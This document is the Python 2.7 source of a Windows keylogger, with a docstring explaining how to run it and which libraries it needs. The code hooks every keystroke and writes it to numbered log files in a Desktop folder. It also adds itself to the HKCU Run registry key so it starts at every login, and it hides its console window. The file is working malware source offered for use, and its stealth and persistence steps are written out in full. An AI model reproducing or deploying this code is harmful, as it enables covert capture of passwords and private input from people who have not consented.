"""
Windows Python KeyLogger 

To Run
--------
Go to the folder where KeyLogger.py is located in Command Prompt
type: python KeyLogger.py 
This should run the file
If it does run, it should create a log folder on your Desktop

If Errors
--------
You must have pythoncom and pyHook in order to run the file
Python Version - 2.7
pyhook - http://sourceforge.net/projects/pyhook/
pythoncom - http://sourceforge.net/projects/pywin32/
pythoncom can also be obtained by downloading ActivePython

"""
 
import pythoncom, pyHook
import os
import glob 
import sys
from _winreg import *

fileName = ""

def startUp():
	if getattr(sys, 'frozen', False):
		fp = os.path.dirname(os.path.realpath(sys.executable))
	elif __file__:
		fp = os.path.dirname(os.path.realpath(__file__))
	fileName = sys.argv[0].split("\\")[-1]
	newFilePath = fp + "\\" + fileName
	
	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
	key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
	
	SetValueEx(key2change, "logger", 0, REG_SZ, newFilePath)

def hideConsole():
	import win32console, win32gui
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window, 0)
	return True

def OnKeyboardEvent(event):
	logFile = open(fileName,'a')
	logFile.write( chr(event.Ascii) )
	logFile.close()
	#Pressing Escape Cancels the program
	if chr(event.Ascii) == 27:
		exit(0)
	return True

#create local text files
def createFile():
	#implement time later.
	#print "Time:", event.Time
	global fileName
	desktop = os.path.expanduser('~') + "/Desktop/Logs/*.txt"
	tempLogs = glob.glob(desktop)
	listLogs = []
	for logs in tempLogs:
		listLogs.append(logs.strip(desktop))
	if listLogs:
		numOfLogs = int(listLogs[len(listLogs) - 1][3:])
		fileName = "log%d%s" % (numOfLogs + 1, ".txt")
	else:
		fileName = "log1.txt"
	fileName = os.path.join(os.path.expanduser('~') + "/Desktop/Logs/", fileName)


def createFolder():
	logsFolder = os.path.expanduser('~') + "/Desktop/Logs"
	if not os.path.exists(logsFolder):
		os.makedirs(logsFolder)
	return True

#creates a folder in Desktop for screenshots
createFolder()
createFile()
startUp()
hideConsole()

keyLog = pyHook.HookManager()
keyLog.KeyDown = OnKeyboardEvent
keyLog.HookKeyboard()
pythoncom.PumpMessages()




























